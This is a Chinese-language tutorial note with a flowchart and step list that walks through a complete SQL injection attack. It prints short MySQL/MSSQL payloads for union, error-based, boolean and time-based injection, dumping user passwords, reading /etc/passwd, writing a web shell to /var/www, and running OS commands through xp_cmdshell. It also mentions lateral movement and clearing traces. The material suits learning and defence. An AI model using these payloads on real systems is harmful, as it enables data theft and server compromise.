# SQL注入完整攻击流程图

```
graph TD
A[开始] --> B{目标识别}
B -->|Web应用| C[注入点探测]
C --> D[参数篡改测试]
D --> E{是否报错?}
E -->|是| F[确定注入类型]
E -->|否| G[盲注检测]
G --> H{页面差异/延迟?}
H -->|是| I[确认盲注存在]
H -->|否| J[结束检测]

F --> K[字符型/数字型判断]
K --> L{是否有回显?}
L -->|是| M[联合查询注入]
L -->|否| N[选择注入方式]
N --> O[报错注入]
N --> P[布尔盲注]
N --> Q[时间盲注]

M --> R[字段数探测]
R --> S[确定显示位]
S --> T[获取数据库信息]
T --> U[数据库版本/用户]
U --> V[爆库名]

P --> W[构造布尔表达式]
W --> X[逐位数据猜测]
Q --> Y[构造时间延迟]
Y --> Z[基于响应的推断]

O --> AA[触发报错函数]
AA --> AB[提取错误信息]

V --> AC[爆表名]
AC --> AD[爆列名]
AD --> AE[拖取数据]

AE --> AF{权限提升?}
AF -->|是| AG[系统命令执行]
AF -->|否| AH[数据导出]

AG --> AI[数据库提权]
AI --> AJ[OS交互]
AJ --> AK[横向移动]

AH --> AL[数据整理分析]
AK --> AL
AL --> AM[清理痕迹]
AM --> AN[攻击完成]

style C fill:#f9f,stroke:#333
style I fill:#bbf,stroke:#555
style T fill:#f96,stroke:#900
style AE fill:#6f9,stroke:#090
style AG fill:#f99,stroke:#c00
```

![Snipaste_2025-04-19_12-51-46](./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-51-46.png)

![Snipaste_2025-04-19_12-52-13](./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-52-13.png)

## 流程图说明

1. **目标识别**：确定存在数据库交互的Web应用

2. **注入点探测**：

   测试URL参数/表单输入

   添加`'`、`"`、`\`等特殊字符

3. **错误判断**：

   直接报错：快速确认注入类型

   无报错：进入盲注检测流程

4. **注入方式选择**：

   联合查询注入（有回显）

   ```sql
   UNION SELECT 1,@@version,3
   ```

   报错注入（显示错误信息）

   ```sql
   AND updatexml(1,concat(0x7e,version()),1)
   ```

   布尔盲注（页面内容差异）

   ```sql
   AND ascii(substr(database(),1,1))>100
   ```

   时间盲注（响应延迟）

   ```sql
   AND IF(1=1,SLEEP(5),0)
   ```

5. **信息收集阶段**：

   获取数据库版本：`@@version`

   列出数据库：`information_schema.schemata`

   爆表名：`information_schema.tables`

   爆列名：`information_schema.columns`

6. **数据提取**：

   常规数据获取：

   ```sql
   UNION SELECT user,password FROM users
   ```

   大段数据获取：

   ```sql
   #用于从服务器文件系统中读取指定文件的内容，并以字符串形式返回
   LOAD_FILE('/etc/passwd')
   ```

7. **权限提升**：

   数据库写文件：

   ```sql
   #可以将查询结果写入服务器上的文件中
   INTO OUTFILE '/var/www/shell.php'
   ```

   执行系统命令：

   ```sql
   #在 MySQL 中，默认情况下并不提供类似 MSSQL 的 xp_cmdshell 功能来直接执行系统命令。 可以通过安装用户自定义函数（UDF）来实现类似的功能。
   MSSQL: xp_cmdshell('whoami')
   #sys_exec() 是由第三方插件 lib_mysqludf_sys 提供的函数，允许在 MySQL 中执行系统命令
   MySQL: sys_exec()
   ```

8. **横向移动**：

   内网扫描
   
   密码爆破
   
   漏洞利用